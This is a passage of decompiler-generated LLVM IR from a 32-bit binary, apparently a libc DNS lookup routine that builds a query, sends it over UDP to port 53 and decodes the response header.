  %v2_8052a2a = inttoptr i32 %v1_8052a2a to i32*
  store i32 1, i32* %v2_8052a2a, align 4
  %v1_8052a32 = urem i32 %v1_8052a29, 65536
  store i32 %v1_8052a32, i32* %eax.global-to-local, align 4
  %v1_8052a37 = load i32, i32* @esp, align 4
  %v2_8052a37 = add i32 %v1_8052a37, 60
  %v3_8052a37 = inttoptr i32 %v2_8052a37 to i32*
  store i32 %v1_8052a32, i32* %v3_8052a37, align 4
  %v0_8052a3b = load i32, i32* %eax.global-to-local, align 4
  %v1_8052a3b = load i32, i32* @esp, align 4
  %v2_8052a3b = add i32 %v1_8052a3b, 84
  %v3_8052a3b = inttoptr i32 %v2_8052a3b to i32*
  store i32 %v0_8052a3b, i32* %v3_8052a3b, align 4
  %v0_8052a3f = load i32, i32* @esp, align 4
  %v1_8052a42 = add i32 %v0_8052a3f, 8
  %v2_8052a42 = inttoptr i32 %v1_8052a42 to i32*
  store i32 512, i32* %v2_8052a42, align 4
  %v2_8052a47 = add i32 %v0_8052a3f, 4
  %v3_8052a47 = inttoptr i32 %v2_8052a47 to i32*
  store i32 %v2_805291a, i32* %v3_8052a47, align 4
  %v0_8052a48 = load i32, i32* @ebx, align 4
  %v3_8052a48 = inttoptr i32 %v0_8052a3f to i32*
  store i32 %v0_8052a48, i32* %v3_8052a48, align 4
  %v0_8052a49 = call i32 @__encode_header()
  store i32 %v0_8052a49, i32* %eax.global-to-local, align 4
  %v0_8052a4e = load i32, i32* @esp, align 4
  store i32 %v0_8052a49, i32* @ebx, align 4
  %v2_8052a53 = icmp slt i32 %v0_8052a49, 0
  br i1 %v2_8052a53, label %dec_label_pc_8052fad, label %dec_label_pc_8052a5b

dec_label_pc_8052a5b:                             ; preds = %dec_label_pc_80529fe
  %v2_8052a5b = add i32 %v0_8052a4e, 12
  %v3_8052a5b = inttoptr i32 %v2_8052a5b to i32*
  store i32 %v0_8052a49, i32* %v3_8052a5b, align 4
  %v1_8052a5c = add i32 %v0_8052a4e, 8
  %v2_8052a5c = inttoptr i32 %v1_8052a5c to i32*
  store i32 1025, i32* %v2_8052a5c, align 4
  %v1_8052a61 = add i32 %v0_8052a4e, 256
  %v2_8052a61 = inttoptr i32 %v1_8052a61 to i32*
  %v3_8052a61 = load i32, i32* %v2_8052a61, align 4
  %v5_8052a61 = add i32 %v0_8052a4e, 4
  %v6_8052a61 = inttoptr i32 %v5_8052a61 to i32*
  store i32 %v3_8052a61, i32* %v6_8052a61, align 4
  %v1_8052a68 = add i32 %v0_8052a4e, 28
  %v2_8052a68 = inttoptr i32 %v1_8052a68 to i32*
  %v3_8052a68 = load i32, i32* %v2_8052a68, align 4
  %v6_8052a68 = inttoptr i32 %v0_8052a4e to i32*
  store i32 %v3_8052a68, i32* %v6_8052a68, align 4
  %v5_8052a6c = call i32 @strncpy(i8* inttoptr (i32 -1 to i8*), i32 %v15_80529a8, i32 %v3_8052a07)
  %v0_8052a71 = load i32, i32* @esp, align 4
  %v1_8052a74 = add i32 %v0_8052a71, 8
  %v2_8052a74 = inttoptr i32 %v1_8052a74 to i32*
  store i32 ptrtoint (i32* @global_var_8059ac8.220 to i32), i32* %v2_8052a74, align 4
  %v1_8052a79 = add i32 %v0_8052a71, 4
  %v2_8052a79 = inttoptr i32 %v1_8052a79 to i32*
  store i32 134550975, i32* %v2_8052a79, align 4
  %v1_8052a7e = add i32 %v0_8052a71, 200
  store i32 %v1_8052a7e, i32* @eax, align 4
  %v3_8052a85 = inttoptr i32 %v0_8052a71 to i32*
  store i32 %v1_8052a7e, i32* %v3_8052a85, align 4
  %v2_8052a86 = call i32 @__pthread_return_void(i32 -1, i32 %v15_80529a8)
  store i32 %v2_8052a86, i32* %eax.global-to-local, align 4
  %v0_8052a8b = load i32, i32* @esp, align 4
  %v1_8052a8b = inttoptr i32 %v0_8052a8b to i32*
  store i32 ptrtoint (i32* @global_var_8059ac8.220 to i32), i32* %v1_8052a8b, align 4
  %v1_8052a92 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8052a92, i32* %eax.global-to-local, align 4
  %v0_8052a97 = load i32, i32* @esp, align 4
  %v1_8052a97 = add i32 %v0_8052a97, 56
  %v2_8052a97 = inttoptr i32 %v1_8052a97 to i32*
  %v3_8052a97 = load i32, i32* %v2_8052a97, align 4
  store i32 %v3_8052a97, i32* %edx.global-to-local, align 4
  %v1_8052a9b = add i32 %v0_8052a97, 268
  %v2_8052a9b = inttoptr i32 %v1_8052a9b to i32*
  %v3_8052a9b = load i32, i32* %v2_8052a9b, align 4
  store i32 %v3_8052a9b, i32* %eax.global-to-local, align 4
  %v2_8052aa2 = mul i32 %v3_8052a97, 4
  %v3_8052aa2 = add i32 %v3_8052a9b, %v2_8052aa2
  %v4_8052aa2 = inttoptr i32 %v3_8052aa2 to i32*
  %v5_8052aa2 = load i32, i32* %v4_8052aa2, align 4
  store i32 %v5_8052aa2, i32* %edx.global-to-local, align 4
  %v2_8052aa5 = add i32 %v0_8052a97, 48
  %v3_8052aa5 = inttoptr i32 %v2_8052aa5 to i32*
  store i32 %v5_8052aa2, i32* %v3_8052aa5, align 4
  %v0_8052aa9 = load i32, i32* @esp, align 4
  %v1_8052aa9 = add i32 %v0_8052aa9, 16
  %v1_8052aac = add i32 %v0_8052aa9, 52
  %v2_8052aac = inttoptr i32 %v1_8052aac to i32*
  %v3_8052aac = load i32, i32* %v2_8052aac, align 4
  %v5_8052aac = icmp slt i32 %v3_8052aac, 0
  br i1 %v5_8052aac, label %dec_label_pc_8052a5b.dec_label_pc_8052af2_crit_edge, label %dec_label_pc_8052ab3

dec_label_pc_8052a5b.dec_label_pc_8052af2_crit_edge: ; preds = %dec_label_pc_8052a5b
  %v0_8052af2.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052af2

dec_label_pc_8052ab3:                             ; preds = %dec_label_pc_8052a5b
  store i32 %v3_8052aac, i32* %eax.global-to-local, align 4
  %v1_8052ab7 = load i32, i32* @global_var_80601b8.281, align 8
  %v2_8052ab7 = sub i32 %v3_8052aac, %v1_8052ab7
  %v8_8052ab7 = xor i32 %v1_8052ab7, %v3_8052aac
  %v9_8052ab7 = xor i32 %v2_8052ab7, %v3_8052aac
  %v10_8052ab7 = and i32 %v9_8052ab7, %v8_8052ab7
  %v11_8052ab7 = icmp slt i32 %v10_8052ab7, 0
  %v13_8052ab7 = icmp slt i32 %v2_8052ab7, 0
  %v2_8052abd = icmp eq i1 %v13_8052ab7, %v11_8052ab7
  br i1 %v2_8052abd, label %dec_label_pc_8052af2, label %dec_label_pc_8052abf

dec_label_pc_8052abf:                             ; preds = %dec_label_pc_8052ab3
  %v2_8052abf = add i32 %v0_8052aa9, 12
  %v3_8052abf = inttoptr i32 %v2_8052abf to i32*
  store i32 %v3_8052aac, i32* %v3_8052abf, align 4
  %v1_8052ac0 = add i32 %v0_8052aa9, 8
  %v2_8052ac0 = inttoptr i32 %v1_8052ac0 to i32*
  store i32 1025, i32* %v2_8052ac0, align 4
  %v1_8052ac5 = add i32 %v0_8052aa9, 4
  %v2_8052ac5 = inttoptr i32 %v1_8052ac5 to i32*
  store i32 ptrtoint (i32* @global_var_805809c.282 to i32), i32* %v2_8052ac5, align 4
  %v1_8052aca = add i32 %v0_8052aa9, 28
  %v2_8052aca = inttoptr i32 %v1_8052aca to i32*
  %v3_8052aca = load i32, i32* %v2_8052aca, align 4
  %v6_8052aca = inttoptr i32 %v0_8052aa9 to i32*
  store i32 %v3_8052aca, i32* %v6_8052aca, align 4
  %v0_8052ace = call i32 @__GI_strncat()
  store i32 %v0_8052ace, i32* %eax.global-to-local, align 4
  %v0_8052ad3 = load i32, i32* @esp, align 4
  %v1_8052ad6 = add i32 %v0_8052ad3, 8
  %v2_8052ad6 = inttoptr i32 %v1_8052ad6 to i32*
  store i32 1025, i32* %v2_8052ad6, align 4
  %v1_8052adb = add i32 %v0_8052ad3, 52
  %v2_8052adb = inttoptr i32 %v1_8052adb to i32*
  %v3_8052adb = load i32, i32* %v2_8052adb, align 4
  store i32 %v3_8052adb, i32* %edx.global-to-local, align 4
  %v1_8052adf = mul i32 %v3_8052adb, 4
  %v2_8052adf = add i32 %v1_8052adf, 134611352
  %v3_8052adf = inttoptr i32 %v2_8052adf to i32*
  %v4_8052adf = load i32, i32* %v3_8052adf, align 4
  %v6_8052adf = add i32 %v0_8052ad3, 4
  %v7_8052adf = inttoptr i32 %v6_8052adf to i32*
  store i32 %v4_8052adf, i32* %v7_8052adf, align 4
  %v1_8052ae6 = add i32 %v0_8052ad3, 28
  %v2_8052ae6 = inttoptr i32 %v1_8052ae6 to i32*
  %v3_8052ae6 = load i32, i32* %v2_8052ae6, align 4
  %v6_8052ae6 = inttoptr i32 %v0_8052ad3 to i32*
  store i32 %v3_8052ae6, i32* %v6_8052ae6, align 4
  %v0_8052aea = call i32 @__GI_strncat()
  store i32 %v0_8052aea, i32* %eax.global-to-local, align 4
  %v0_8052aef = load i32, i32* @esp, align 4
  %v1_8052aef = add i32 %v0_8052aef, 16
  br label %dec_label_pc_8052af2

dec_label_pc_8052af2:                             ; preds = %dec_label_pc_8052a5b.dec_label_pc_8052af2_crit_edge, %dec_label_pc_8052ab3, %dec_label_pc_8052abf
  %v1_8052af2 = phi i32 [ %v1_8052aa9, %dec_label_pc_8052a5b.dec_label_pc_8052af2_crit_edge ], [ %v1_8052aa9, %dec_label_pc_8052ab3 ], [ %v1_8052aef, %dec_label_pc_8052abf ]
  %v0_8052af2 = phi i32 [ %v0_8052af2.pre, %dec_label_pc_8052a5b.dec_label_pc_8052af2_crit_edge ], [ %v3_8052aac, %dec_label_pc_8052ab3 ], [ %v0_8052aea, %dec_label_pc_8052abf ]
  %v2_8052af2 = add i32 %v1_8052af2, -4
  %v3_8052af2 = inttoptr i32 %v2_8052af2 to i32*
  store i32 %v0_8052af2, i32* %v3_8052af2, align 4
  %v0_8052af3 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052af3 = add i32 %v1_8052af2, -8
  %v3_8052af3 = inttoptr i32 %v2_8052af3 to i32*
  store i32 %v0_8052af3, i32* %v3_8052af3, align 4
  %v1_8052af4 = add i32 %v1_8052af2, -12
  %v2_8052af4 = inttoptr i32 %v1_8052af4 to i32*
  store i32 1, i32* %v2_8052af4, align 4
  %v1_8052af6 = add i32 %v1_8052af2, 184
  store i32 %v1_8052af6, i32* @eax, align 4
  %v2_8052afd = add i32 %v1_8052af2, -16
  %v3_8052afd = inttoptr i32 %v2_8052afd to i32*
  store i32 %v1_8052af6, i32* %v3_8052afd, align 4
  %v2_8052afe = call i32 @__pthread_return_void(i32 -1, i32 %v15_80529a8)
  store i32 %v2_8052afe, i32* %eax.global-to-local, align 4
  %v0_8052b03 = load i32, i32* @esp, align 4
  %v1_8052b03 = add i32 %v0_8052b03, 28
  %v2_8052b03 = inttoptr i32 %v1_8052b03 to i32*
  %v3_8052b03 = load i32, i32* %v2_8052b03, align 4
  store i32 %v3_8052b03, i32* %eax.global-to-local, align 4
  %v1_8052b07 = add i32 %v0_8052b03, 260
  %v2_8052b07 = inttoptr i32 %v1_8052b07 to i32*
  %v3_8052b07 = load i32, i32* %v2_8052b07, align 4
  store i32 %v3_8052b07, i32* @edx, align 4
  %v2_8052b0e = add i32 %v0_8052b03, 216
  %v3_8052b0e = inttoptr i32 %v2_8052b0e to i32*
  store i32 %v3_8052b03, i32* %v3_8052b0e, align 4
  %v0_8052b15 = load i32, i32* @edx, align 4
  %v1_8052b15 = load i32, i32* @esp, align 4
  %v2_8052b15 = add i32 %v1_8052b15, 220
  %v3_8052b15 = inttoptr i32 %v2_8052b15 to i32*
  store i32 %v0_8052b15, i32* %v3_8052b15, align 4
  %v0_8052b1c = load i32, i32* @esp, align 4
  %v1_8052b1c = add i32 %v0_8052b1c, 224
  %v2_8052b1c = inttoptr i32 %v1_8052b1c to i32*
  store i32 1, i32* %v2_8052b1c, align 4
  %v0_8052b2c = load i32, i32* @esp, align 4
  %v1_8052b2f = load i32, i32* @ebx, align 4
  %v2_8052b2f = sub i32 512, %v1_8052b2f
  %v2_8052b31 = add i32 %v0_8052b2c, 8
  %v3_8052b31 = inttoptr i32 %v2_8052b31 to i32*
  store i32 %v2_8052b2f, i32* %v3_8052b31, align 4
  %v1_8052b32 = load i32, i32* @ebx, align 4
  %v2_8052b32 = add i32 %v1_8052b32, %v2_805291a
  %v2_8052b36 = add i32 %v0_8052b2c, 4
  %v3_8052b36 = inttoptr i32 %v2_8052b36 to i32*
  store i32 %v2_8052b32, i32* %v3_8052b36, align 4
  %v1_8052b37 = add i32 %v0_8052b2c, 216
  store i32 %v1_8052b37, i32* @eax, align 4
  %v3_8052b3e = inttoptr i32 %v0_8052b2c to i32*
  store i32 %v1_8052b37, i32* %v3_8052b3e, align 4
  %v0_8052b3f = call i32 @__encode_question()
  store i32 %v0_8052b3f, i32* %eax.global-to-local, align 4
  %v0_8052b44 = load i32, i32* @esp, align 4
  store i32 %v0_8052b3f, i32* @esi, align 4
  %v2_8052b49 = icmp slt i32 %v0_8052b3f, 0
  br i1 %v2_8052b49, label %dec_label_pc_8052fad, label %dec_label_pc_8052b51

dec_label_pc_8052b51:                             ; preds = %dec_label_pc_8052af2
  %v1_8052b51 = add i32 %v0_8052b44, 172
  %v2_8052b51 = inttoptr i32 %v1_8052b51 to i16*
  store i16 2, i16* %v2_8052b51, align 2
  %v1_8052b5b = load i32, i32* @esp, align 4
  %v2_8052b5b = add i32 %v1_8052b5b, -4
  %v3_8052b5b = inttoptr i32 %v2_8052b5b to i32*
  store i32 %v0_8052b3f, i32* %v3_8052b5b, align 4
  %v1_8052b5c = add i32 %v1_8052b5b, 164
  store i32 %v1_8052b5c, i32* %eax.global-to-local, align 4
  %v2_8052b63 = add i32 %v1_8052b5b, -8
  %v3_8052b63 = inttoptr i32 %v2_8052b63 to i32*
  store i32 %v1_8052b5c, i32* %v3_8052b63, align 4
  %v1_8052b64 = add i32 %v1_8052b5b, 32
  %v2_8052b64 = inttoptr i32 %v1_8052b64 to i32*
  %v3_8052b64 = load i32, i32* %v2_8052b64, align 4
  %v5_8052b64 = add i32 %v1_8052b5b, -12
  %v6_8052b64 = inttoptr i32 %v5_8052b64 to i32*
  store i32 %v3_8052b64, i32* %v6_8052b64, align 4
  %v1_8052b68 = add i32 %v1_8052b5b, -16
  %v2_8052b68 = inttoptr i32 %v1_8052b68 to i32*
  store i32 10, i32* %v2_8052b68, align 4
  %v6_8052b6a = call i32 @inet_pton(i32 -1, i8* %v5_8052b6a, i32 %v3_8052a07, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8052b6a, i32* %eax.global-to-local, align 4
  %v0_8052b6f = load i32, i32* @esp, align 4
  %v1_8052b6f = add i32 %v0_8052b6f, 16
  %tmp47 = icmp slt i32 %v6_8052b6a, 1
  br i1 %tmp47, label %dec_label_pc_8052b80, label %dec_label_pc_8052b76

dec_label_pc_8052b76:                             ; preds = %dec_label_pc_8052b51
  %v1_8052b76 = add i32 %v0_8052b6f, 172
  %v2_8052b76 = inttoptr i32 %v1_8052b76 to i16*
  store i16 10, i16* %v2_8052b76, align 2
  %v0_8052b80.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052b80

dec_label_pc_8052b80:                             ; preds = %dec_label_pc_8052b51, %dec_label_pc_8052b76
  %v0_8052b97 = phi i32 [ %v1_8052b6f, %dec_label_pc_8052b51 ], [ %v0_8052b80.pre, %dec_label_pc_8052b76 ]
  %v1_8052b80 = add i32 %v0_8052b97, 156
  %v2_8052b80 = inttoptr i32 %v1_8052b80 to i16*
  %v3_8052b80 = load i16, i16* %v2_8052b80, align 2
  %v12_8052b80 = icmp eq i16 %v3_8052b80, 10
  %v1_8052b89 = icmp eq i1 %v12_8052b80, false
  %v1_8052b97 = add i32 %v0_8052b97, 158
  %v2_8052b97 = inttoptr i32 %v1_8052b97 to i16*
  store i16 13568, i16* %v2_8052b97, align 2
  %v0_8052ba1 = load i32, i32* @esp, align 4
  br i1 %v1_8052b89, label %dec_label_pc_8052b97, label %dec_label_pc_8052bb7

dec_label_pc_8052b97:                             ; preds = %dec_label_pc_8052b80
  %v1_8052ba4 = add i32 %v0_8052ba1, 32
  %v2_8052ba4 = inttoptr i32 %v1_8052ba4 to i32*
  %v3_8052ba4 = load i32, i32* %v2_8052ba4, align 4
  %v5_8052ba4 = add i32 %v0_8052ba1, -16
  %v6_8052ba4 = inttoptr i32 %v5_8052ba4 to i32*
  store i32 %v3_8052ba4, i32* %v6_8052ba4, align 4
  %v1_8052ba8 = call i32 @inet_addr(i32 -1)
  store i32 %v1_8052ba8, i32* %eax.global-to-local, align 4
  %v1_8052bad = load i32, i32* @esp, align 4
  %v2_8052bad = add i32 %v1_8052bad, 176
  %v3_8052bad = inttoptr i32 %v2_8052bad to i32*
  store i32 %v1_8052ba8, i32* %v3_8052bad, align 4
  %v0_8052bb4 = load i32, i32* @esp, align 4
  %v1_8052bb4 = add i32 %v0_8052bb4, 16
  br label %dec_label_pc_8052bb7

dec_label_pc_8052bb7:                             ; preds = %dec_label_pc_8052b80, %dec_label_pc_8052b97
  %v1_8052bb7 = phi i32 [ %v1_8052bb4, %dec_label_pc_8052b97 ], [ %v0_8052ba1, %dec_label_pc_8052b80 ]
  %v0_8052bb7 = load i32, i32* @ecx, align 4
  %v2_8052bb7 = add i32 %v1_8052bb7, -4
  %v3_8052bb7 = inttoptr i32 %v2_8052bb7 to i32*
  store i32 %v0_8052bb7, i32* %v3_8052bb7, align 4
  %v1_8052bb8 = add i32 %v1_8052bb7, -8
  %v2_8052bb8 = inttoptr i32 %v1_8052bb8 to i32*
  store i32 17, i32* %v2_8052bb8, align 4
  %v1_8052bba = add i32 %v1_8052bb7, -12
  %v2_8052bba = inttoptr i32 %v1_8052bba to i32*
  store i32 2, i32* %v2_8052bba, align 4
  %v1_8052bbc = add i32 %v1_8052bb7, 156
  %v2_8052bbc = inttoptr i32 %v1_8052bbc to i16*
  %v3_8052bbc = load i16, i16* %v2_8052bbc, align 2
  %v4_8052bbc = zext i16 %v3_8052bbc to i32
  store i32 %v4_8052bbc, i32* %eax.global-to-local, align 4
  %v2_8052bc4 = add i32 %v1_8052bb7, -16
  %v3_8052bc4 = inttoptr i32 %v2_8052bc4 to i32*
  store i32 %v4_8052bbc, i32* %v3_8052bc4, align 4
  %v4_8052bc5 = call i32 @socket(i32 -1, i32 %v15_80529a8, i32 %v3_8052a07)
  store i32 %v4_8052bc5, i32* %eax.global-to-local, align 4
  %v1_8052bca = load i32, i32* @esp, align 4
  %v2_8052bca = add i32 %v1_8052bca, 36
  %v3_8052bca = inttoptr i32 %v2_8052bca to i32*
  store i32 %v4_8052bc5, i32* %v3_8052bca, align 4
  %v0_8052bce = load i32, i32* @esp, align 4
  %v1_8052bce = add i32 %v0_8052bce, 16
  %v0_8052bd1 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052bd1 = icmp slt i32 %v0_8052bd1, 0
  br i1 %v2_8052bd1, label %dec_label_pc_8052bfe, label %dec_label_pc_8052bd5

dec_label_pc_8052bd5:                             ; preds = %dec_label_pc_8052bb7
  %v1_8052bd5 = add i32 %v0_8052bce, 172
  store i32 %v1_8052bd5, i32* %eax.global-to-local, align 4
  %v0_8052bdc = load i32, i32* @edx, align 4
  %v2_8052bdc = add i32 %v0_8052bce, 12
  %v3_8052bdc = inttoptr i32 %v2_8052bdc to i32*
  store i32 %v0_8052bdc, i32* %v3_8052bdc, align 4
  %v1_8052bdd = add i32 %v0_8052bce, 8
  %v2_8052bdd = inttoptr i32 %v1_8052bdd to i32*
  store i32 28, i32* %v2_8052bdd, align 4
  %v0_8052bdf = load i32, i32* %eax.global-to-local, align 4
  %v2_8052bdf = add i32 %v0_8052bce, 4
  %v3_8052bdf = inttoptr i32 %v2_8052bdf to i32*
  store i32 %v0_8052bdf, i32* %v3_8052bdf, align 4
  %v1_8052be0 = add i32 %v0_8052bce, 36
  %v2_8052be0 = inttoptr i32 %v1_8052be0 to i32*
  %v3_8052be0 = load i32, i32* %v2_8052be0, align 4
  %v6_8052be0 = inttoptr i32 %v0_8052bce to i32*
  store i32 %v3_8052be0, i32* %v6_8052be0, align 4
  %v4_8052be4 = call i32 @__libc_connect(i32 -1, i32 %v15_80529a8, i32 %v3_8052a07)
  store i32 %v4_8052be4, i32* %eax.global-to-local, align 4
  %v0_8052be9 = load i32, i32* @esp, align 4
  %v2_8052bec = icmp slt i32 %v4_8052be4, 0
  %v1_8052bee = icmp eq i1 %v2_8052bec, false
  br i1 %v1_8052bee, label %dec_label_pc_8052c07, label %dec_label_pc_8052bf0

dec_label_pc_8052bf0:                             ; preds = %dec_label_pc_8052bd5
  %v1_8052bf0 = call i32 @__errno_location(i32 -1)
  store i32 %v1_8052bf0, i32* %eax.global-to-local, align 4
  %v1_8052bf5 = inttoptr i32 %v1_8052bf0 to i32*
  %v2_8052bf5 = load i32, i32* %v1_8052bf5, align 4
  %v11_8052bf5 = icmp eq i32 %v2_8052bf5, 101
  %v0_8052f67.pre = load i32, i32* @esp, align 4
  br i1 %v11_8052bf5, label %dec_label_pc_8052f67, label %dec_label_pc_8052bfe

dec_label_pc_8052bfe:                             ; preds = %dec_label_pc_8052bf0, %dec_label_pc_8052bb7
  %v17_8052bfe = phi i32 [ %v1_8052bce, %dec_label_pc_8052bb7 ], [ %v0_8052f67.pre, %dec_label_pc_8052bf0 ]
  %v1_8052bfe = add i32 %v17_8052bfe, 28
  %v2_8052bfe = inttoptr i32 %v1_8052bfe to i32*
  %v3_8052bfe = load i32, i32* %v2_8052bfe, align 4
  %v4_8052bfe = add i32 %v3_8052bfe, 1
  store i32 %v4_8052bfe, i32* %v2_8052bfe, align 4
  br label %dec_label_pc_8052f88.backedge

dec_label_pc_8052c07:                             ; preds = %dec_label_pc_8052bd5
  %v0_8052c07 = load i32, i32* @ebx, align 4
  %v1_8052c07 = load i32, i32* @esi, align 4
  %v2_8052c07 = add i32 %v1_8052c07, %v0_8052c07
  store i32 %v2_8052c07, i32* %eax.global-to-local, align 4
  %v1_8052c0a = add i32 %v0_8052be9, 12
  %v2_8052c0a = inttoptr i32 %v1_8052c0a to i32*
  store i32 0, i32* %v2_8052c0a, align 4
  %v0_8052c0c = load i32, i32* %eax.global-to-local, align 4
  %v2_8052c0c = add i32 %v0_8052be9, 8
  %v3_8052c0c = inttoptr i32 %v2_8052c0c to i32*
  store i32 %v0_8052c0c, i32* %v3_8052c0c, align 4
  %v2_8052c0d = add i32 %v0_8052be9, 4
  %v3_8052c0d = inttoptr i32 %v2_8052c0d to i32*
  store i32 %v2_805291a, i32* %v3_8052c0d, align 4
  %v1_8052c0e = add i32 %v0_8052be9, 36
  %v2_8052c0e = inttoptr i32 %v1_8052c0e to i32*
  %v3_8052c0e = load i32, i32* %v2_8052c0e, align 4
  %v6_8052c0e = inttoptr i32 %v0_8052be9 to i32*
  store i32 %v3_8052c0e, i32* %v6_8052c0e, align 4
  %v5_8052c12 = call i32 @__libc_send(i32 -1, i32 %v15_80529a8, i32 %v3_8052a07, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8052c12, i32* %eax.global-to-local, align 4
  %v0_8052c17 = load i32, i32* @esp, align 4
  %v1_8052c17 = add i32 %v0_8052c17, 36
  %v2_8052c17 = inttoptr i32 %v1_8052c17 to i32*
  %v3_8052c17 = load i32, i32* %v2_8052c17, align 4
  %v2_8052c1b = add i32 %v0_8052c17, 228
  %v3_8052c1b = inttoptr i32 %v2_8052c1b to i32*
  store i32 %v3_8052c17, i32* %v3_8052c1b, align 4
  %v0_8052c22 = load i32, i32* @esp, align 4
  %v1_8052c22 = add i32 %v0_8052c22, 232
  %v2_8052c22 = inttoptr i32 %v1_8052c22 to i16*
  store i16 1, i16* %v2_8052c22, align 2
  %v0_8052c2c = load i32, i32* @esp, align 4
  %v1_8052c2f = add i32 %v0_8052c2c, 8
  %v2_8052c2f = inttoptr i32 %v1_8052c2f to i32*
  store i32 10000, i32* %v2_8052c2f, align 4
  %v1_8052c34 = add i32 %v0_8052c2c, 4
  %v2_8052c34 = inttoptr i32 %v1_8052c34 to i32*
  store i32 1, i32* %v2_8052c34, align 4
  %v1_8052c36 = add i32 %v0_8052c2c, 228
  store i32 %v1_8052c36, i32* %eax.global-to-local, align 4
  %v3_8052c3d = inttoptr i32 %v0_8052c2c to i32*
  store i32 %v1_8052c36, i32* %v3_8052c3d, align 4
  %v0_8052c3e = call i32 @__libc_poll()
  store i32 %v0_8052c3e, i32* %eax.global-to-local, align 4
  %v0_8052c43 = load i32, i32* @esp, align 4
  %v1_8052c43 = add i32 %v0_8052c43, 16
  %tmp48 = icmp slt i32 %v0_8052c3e, 1
  br i1 %tmp48, label %dec_label_pc_8052f67, label %dec_label_pc_8052c4e

dec_label_pc_8052c4e:                             ; preds = %dec_label_pc_8052c07
  %v1_8052c4e = add i32 %v0_8052c43, 12
  %v2_8052c4e = inttoptr i32 %v1_8052c4e to i32*
  store i32 0, i32* %v2_8052c4e, align 4
  %v1_8052c50 = add i32 %v0_8052c43, 8
  %v2_8052c50 = inttoptr i32 %v1_8052c50 to i32*
  store i32 512, i32* %v2_8052c50, align 4
  %v2_8052c55 = add i32 %v0_8052c43, 4
  %v3_8052c55 = inttoptr i32 %v2_8052c55 to i32*
  store i32 %v2_805291a, i32* %v3_8052c55, align 4
  %v1_8052c56 = add i32 %v0_8052c43, 36
  %v2_8052c56 = inttoptr i32 %v1_8052c56 to i32*
  %v3_8052c56 = load i32, i32* %v2_8052c56, align 4
  %v6_8052c56 = inttoptr i32 %v0_8052c43 to i32*
  store i32 %v3_8052c56, i32* %v6_8052c56, align 4
  %v5_8052c5a = call i32 @__libc_recv(i32 -1, i32 %v15_80529a8, i32 %v3_8052a07, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8052c5a, i32* @eax, align 4
  %v1_8052c5f = load i32, i32* @esp, align 4
  %v2_8052c5f = add i32 %v1_8052c5f, 32
  %v3_8052c5f = inttoptr i32 %v2_8052c5f to i32*
  store i32 %v5_8052c5a, i32* %v3_8052c5f, align 4
  %v0_8052c63 = load i32, i32* @esp, align 4
  %v1_8052c63 = add i32 %v0_8052c63, 16
  %v7_8052c69 = icmp sgt i32 %v5_8052c5a, 11
  br i1 %v7_8052c69, label %dec_label_pc_8052c6f, label %dec_label_pc_8052f1c

dec_label_pc_8052c6f:                             ; preds = %dec_label_pc_8052c4e
  %v0_8052c6f = load i32, i32* @ebx, align 4
  %v2_8052c6f = add i32 %v0_8052c63, 12
  %v3_8052c6f = inttoptr i32 %v2_8052c6f to i32*
  store i32 %v0_8052c6f, i32* %v3_8052c6f, align 4
  %v0_8052c70 = load i32, i32* @ebx, align 4
  %v2_8052c70 = add i32 %v0_8052c63, 8
  %v3_8052c70 = inttoptr i32 %v2_8052c70 to i32*
  store i32 %v0_8052c70, i32* %v3_8052c70, align 4
  %v1_8052c71 = add i32 %v0_8052c63, 84
  store i32 %v1_8052c71, i32* %eax.global-to-local, align 4
  %v2_8052c75 = add i32 %v0_8052c63, 4
  %v3_8052c75 = inttoptr i32 %v2_8052c75 to i32*
  store i32 %v1_8052c71, i32* %v3_8052c75, align 4
  %v3_8052c76 = inttoptr i32 %v0_8052c63 to i32*
  store i32 %v2_805291a, i32* %v3_8052c76, align 4
  %v0_8052c77 = call i32 @__decode_header()
  store i32 %v0_8052c77, i32* %eax.global-to-local, align 4
  %v0_8052c7c = load i32, i32* @esp, align 4
  %v1_8052c7c = add i32 %v0_8052c7c, 84
  %v2_8052c7c = inttoptr i32 %v1_8052c7c to i32*
  %v3_8052c7c = load i32, i32* %v2_8052c7c, align 4
  store i32 %v3_8052c7c, i32* %edx.global-to-local, align 4
  %v2_8052c80 = add i32 %v0_8052c7c, 72
  %v3_8052c80 = inttoptr i32 %v2_8052c80 to i32*
  store i32 %v3_8052c7c, i32* %v3_8052c80, align 4
  %v0_8052c84 = load i32, i32* @esp, align 4
  %v1_8052c84 = add i32 %v0_8052c84, 16
  %v1_8052c87 = add i32 %v0_8052c84, 60
  %v2_8052c87 = inttoptr i32 %v1_8052c87 to i32*
  %v3_8052c87 = load i32, i32* %v2_8052c87, align 4
  store i32 %v3_8052c87, i32* @eax, align 4
  %v0_8052c8b = load i32, i32* %edx.global-to-local, align 4
  %v12_8052c8b = icmp eq i32 %v0_8052c8b, %v3_8052c87
  %v1_8052c8d = icmp eq i1 %v12_8052c8b, false
  br i1 %v1_8052c8d, label %dec_label_pc_8052f1c, label %dec_label_pc_8052c93

dec_label_pc_8052c93:                             ; preds = %dec_label_pc_8052c6f
  %v1_8052c93 = add i32 %v0_8052c84, 88
  %v2_8052c93 = inttoptr i32 %v1_8052c93 to i32*
  %v3_8052c93 = load i32, i32* %v2_8052c93, align 4
  %v4_8052c93 = icmp eq i32 %v3_8052c93, 0
  br i1 %v4_8052c93, label %dec_label_pc_8052f1c, label %dec_label_pc_8052c9e

dec_label_pc_8052c9e:                             ; preds = %dec_label_pc_8052c93
  %v1_8052c9e = add i32 %v0_8052c84, 112
  %v2_8052c9e = inttoptr i32 %v1_8052c9e to i32*
  %v3_8052c9e = load i32, i32* %v2_8052c9e, align 4
  store i32 %v3_8052c9e, i32* @eax, align 4
  %v9_8052ca2 = icmp eq i32 %v3_8052c9e, 3
  %v1_8052ca5 = icmp eq i1 %v9_8052ca2, false
  br i1 %v1_8052ca5, label %dec_label_pc_8052d0d, label %dec_label_pc_8052ca7

dec_label_pc_8052ca7:                             ; preds = %dec_label_pc_8052c9e
  %v1_8052ca7 = add i32 %v0_8052c84, 67
  %v2_8052ca7 = inttoptr i32 %v1_8052ca7 to i8*
